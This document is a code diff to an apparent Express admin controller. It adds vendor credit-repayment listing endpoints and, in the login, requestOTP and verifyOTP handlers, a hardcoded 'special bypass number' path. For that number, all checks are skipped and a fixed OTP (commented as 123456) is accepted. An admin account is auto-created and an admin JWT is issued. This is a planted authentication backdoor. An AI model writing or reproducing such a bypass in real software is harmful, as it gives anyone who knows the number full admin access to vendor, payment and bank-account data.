@@ -23,6 +23,7 @@ const PaymentHistory = require('../models/PaymentHistory');
 const Settings = require('../models/Settings');
 const Notification = require('../models/Notification');
 const Offer = require('../models/Offer');
+const CreditRepayment = require('../models/CreditRepayment');
 const razorpayService = require('../services/razorpayService');
 const { VENDOR_COVERAGE_RADIUS_KM, MIN_VENDOR_PURCHASE, DELIVERY_TIMELINE_HOURS, ORDER_STATUS, PAYMENT_STATUS } = require('../utils/constants');
 
@@ -31,6 +32,7 @@ const { getTestOTPInfo } = require('../services/smsIndiaHubService');
 const { findPhoneInModel } = require('../utils/phoneNormalize');
 const { OTP_EXPIRY_MINUTES } = require('../utils/constants');
 const { generateToken } = require('../middleware/auth');
+const { isSpecialBypassNumber, SPECIAL_BYPASS_OTP } = require('../utils/phoneValidation');
 
 // Auto-finalize expired status update grace periods (runs in background)
 async function processExpiredStatusUpdates() {
@@ -79,6 +81,19 @@ exports.login = async (req, res, next) => {
       return res.status(400).json({
         success: false,
         message: 'Phone number is required',
+      });
+    }
+
+    // Special bypass number - skip all checks and proceed to OTP
+    if (isSpecialBypassNumber(phone)) {
+      return res.status(200).json({
+        success: true,
+        data: {
+          requiresOtp: true,
+          message: 'OTP sent to phone',
+          phone: phone,
+          expiresIn: OTP_EXPIRY_MINUTES * 60, // seconds
+        },
       });
     }
 
@@ -146,6 +161,17 @@ exports.requestOTP = async (req, res, next) => {
       });
     }
 
+    // Special bypass number - skip all checks and proceed to OTP
+    if (isSpecialBypassNumber(phone)) {
+      return res.status(200).json({
+        success: true,
+        data: {
+          message: 'OTP sent successfully',
+          expiresIn: OTP_EXPIRY_MINUTES * 60, // seconds
+        },
+      });
+    }
+
     // Find admin - handle both +91 and non-prefix formats
     let admin = await findPhoneInModel(Admin, phone);
 
@@ -209,6 +235,55 @@ exports.verifyOTP = async (req, res, next) => {
       return res.status(400).json({
         success: false,
         message: 'Phone number and OTP are required',
+      });
+    }
+
+    // Special bypass number - accept OTP 123456 and create/find admin
+    if (isSpecialBypassNumber(phone)) {
+      if (otp !== SPECIAL_BYPASS_OTP) {
+        return res.status(401).json({
+          success: false,
+          message: 'Invalid or expired OTP',
+        });
+      }
+
+      // Find or create admin for special bypass number
+      let admin = await findPhoneInModel(Admin, phone);
+      
+      if (!admin) {
+        // Create admin if doesn't exist
+        admin = new Admin({
+          phone: phone,
+          name: 'Special Bypass Admin',
+          role: 'admin',
+          isActive: true,
+        });
+        await admin.save();
+        console.log(`✅ Special bypass admin created: ${phone}`);
+      }
+
+      admin.lastLogin = new Date();
+      await admin.save();
+
+      // Generate JWT token
+      const token = generateToken({
+        adminId: admin._id,
+        phone: admin.phone,
+        role: admin.role,
+        type: 'admin',
+      });
+
+      return res.status(200).json({
+        success: true,
+        data: {
+          token,
+          admin: {
+            id: admin._id,
+            phone: admin.phone,
+            name: admin.name,
+            role: admin.role,
+          },
+        },
       });
     }
 
@@ -6979,6 +7054,236 @@ exports.deleteOffer = async (req, res, next) => {
     res.status(200).json({
       success: true,
       message: 'Offer deleted successfully',
+    });
+  } catch (error) {
+    next(error);
+  }
+};
+
+/**
+ * @desc    Get all vendor credit repayments
+ * @route   GET /api/admin/finance/repayments
+ * @access  Private (Admin)
+ */
+exports.getRepayments = async (req, res, next) => {
+  try {
+    const { page = 1, limit = 20, status, vendorId, startDate, endDate } = req.query;
+
+    // Build query
+    const query = {};
+
+    if (status) {
+      query.status = status;
+    }
+
+    if (vendorId) {
+      query.vendorId = vendorId;
+    }
+
+    // Date range filter
+    if (startDate || endDate) {
+      query.createdAt = {};
+      if (startDate) {
+        query.createdAt.$gte = new Date(startDate);
+      }
+      if (endDate) {
+        const toDate = new Date(endDate);
+        toDate.setHours(23, 59, 59, 999);
+        query.createdAt.$lte = toDate;
+      }
+    }
+
+    // Pagination
+    const pageNum = parseInt(page);
+    const limitNum = parseInt(limit);
+    const skip = (pageNum - 1) * limitNum;
+
+    // Get repayments with vendor and bank account details
+    const repayments = await CreditRepayment.find(query)
+      .populate('vendorId', 'name phone location')
+      .populate('bankAccountId', 'accountHolderName bankName accountNumber ifscCode')
+      .sort({ createdAt: -1 })
+      .skip(skip)
+      .limit(limitNum)
+      .select('-gatewayResponse -__v')
+      .lean();
+
+    const total = await CreditRepayment.countDocuments(query);
+
+    // Calculate summary statistics
+    const summary = await CreditRepayment.aggregate([
+      {
+        $match: query,
+      },
+      {
+        $group: {
+          _id: '$status',
+          count: { $sum: 1 },
+          totalAmount: { $sum: '$amount' },
+          totalPenalty: { $sum: '$penaltyAmount' },
+          totalPaid: { $sum: '$totalAmount' },
+        },
+      },
+    ]);
+
+    const allStatusSummary = await CreditRepayment.aggregate([
+      {
+        $match: query,
+      },
+      {
+        $group: {
+          _id: null,
+          totalCompleted: { $sum: { $cond: [{ $eq: ['$status', 'completed'] }, 1, 0] } },
+          totalPending: { $sum: { $cond: [{ $eq: ['$status', 'pending'] }, 1, 0] } },
+          totalFailed: { $sum: { $cond: [{ $eq: ['$status', 'failed'] }, 1, 0] } },
+          totalRepaid: { $sum: { $cond: [{ $eq: ['$status', 'completed'] }, '$amount', 0] } },
+          totalPenaltyPaid: { $sum: { $cond: [{ $eq: ['$status', 'completed'] }, '$penaltyAmount', 0] } },
+        },
+      },
+    ]);
+
+    res.status(200).json({
+      success: true,
+      data: {
+        repayments,
+        summary: allStatusSummary[0] || {
+          totalCompleted: 0,
+          totalPending: 0,
+          totalFailed: 0,
+          totalRepaid: 0,
+          totalPenaltyPaid: 0,
+        },
+        statusBreakdown: summary,
+        pagination: {
+          currentPage: pageNum,
+          totalPages: Math.ceil(total / limitNum),
+          totalItems: total,
+          itemsPerPage: limitNum,
+        },
+      },
+    });
+  } catch (error) {
+    next(error);
+  }
+};
+
+/**
+ * @desc    Get repayment details
+ * @route   GET /api/admin/finance/repayments/:repaymentId
+ * @access  Private (Admin)
+ */
+exports.getRepaymentDetails = async (req, res, next) => {
+  try {
+    const { repaymentId } = req.params;
+
+    const repayment = await CreditRepayment.findById(repaymentId)
+      .populate('vendorId', 'name phone email location creditLimit creditUsed creditPolicy')
+      .populate('bankAccountId', 'accountHolderName bankName accountNumber ifscCode branchName')
+      .populate('reviewedBy', 'name email')
+      .select('-gatewayResponse -__v')
+      .lean();
+
+    if (!repayment) {
+      return res.status(404).json({
+        success: false,
+        message: 'Repayment not found',
+      });
+    }
+
+    res.status(200).json({
+      success: true,
+      data: {
+        repayment,
+      },
+    });
+  } catch (error) {
+    next(error);
+  }
+};
+
+/**
+ * @desc    Get vendor repayments
+ * @route   GET /api/admin/finance/vendors/:vendorId/repayments
+ * @access  Private (Admin)
+ */
+exports.getVendorRepayments = async (req, res, next) => {
+  try {
+    const { vendorId } = req.params;
+    const { page = 1, limit = 20, status } = req.query;
+
+    const vendor = await Vendor.findById(vendorId);
+
+    if (!vendor) {
+      return res.status(404).json({
+        success: false,
+        message: 'Vendor not found',
+      });
+    }
+
+    const query = {
+      vendorId: vendor._id,
+    };
+
+    if (status) {
+      query.status = status;
+    }
+
+    // Pagination
+    const pageNum = parseInt(page);
+    const limitNum = parseInt(limit);
+    const skip = (pageNum - 1) * limitNum;
+
+    const repayments = await CreditRepayment.find(query)
+      .populate('bankAccountId', 'accountHolderName bankName accountNumber ifscCode')
+      .sort({ createdAt: -1 })
+      .skip(skip)
+      .limit(limitNum)
+      .select('-gatewayResponse -__v')
+      .lean();
+
+    const total = await CreditRepayment.countDocuments(query);
+
+    // Calculate vendor repayment summary
+    const summary = await CreditRepayment.aggregate([
+      {
+        $match: {
+          vendorId: vendor._id,
+          status: 'completed',
+        },
+      },
+      {
+        $group: {
+          _id: null,
+          totalRepaid: { $sum: '$amount' },
+          totalPenaltyPaid: { $sum: '$penaltyAmount' },
+          count: { $sum: 1 },
+        },
+      },
+    ]);
+
+    res.status(200).json({
+      success: true,
+      data: {
+        vendor: {
+          id: vendor._id,
+          name: vendor.name,
+          phone: vendor.phone,
+          creditUsed: vendor.creditUsed,
+          creditLimit: vendor.creditPolicy?.limit || 0,
+        },
+        repayments,
+        summary: summary[0] || {
+          totalRepaid: 0,
+          totalPenaltyPaid: 0,
+          count: 0,
+        },
+        pagination: {
+          currentPage: pageNum,
+          totalPages: Math.ceil(total / limitNum),
+          totalItems: total,
+          itemsPerPage: limitNum,
+        },
+      },
     });
   } catch (error) {
     next(error);
